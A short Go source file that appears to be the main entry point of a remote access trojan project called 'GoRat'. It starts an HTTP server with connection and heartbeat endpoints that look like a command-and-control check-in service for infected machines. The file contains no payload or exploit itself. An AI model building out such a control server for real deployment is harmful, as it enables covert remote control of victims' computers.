package main

import (
	"net/http"

	"github.com/NotKatsu/GoRat/database"

	"github.com/NotKatsu/GoRat/endpoints"
	"github.com/pterm/pterm"
)

func main() {
	if database.CreateTables() == true {
		http.HandleFunc("/connection/new", endpoints.ConnectionNew)
		http.HandleFunc("/connection/heartbeat", endpoints.ConnectionHeartbeat)

		err := http.ListenAndServe(":8080", nil)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		}
	} else {
		pterm.Fatal.WithFatal(true).Println("There was an error when the database tables were trying to be created.")
	}
}
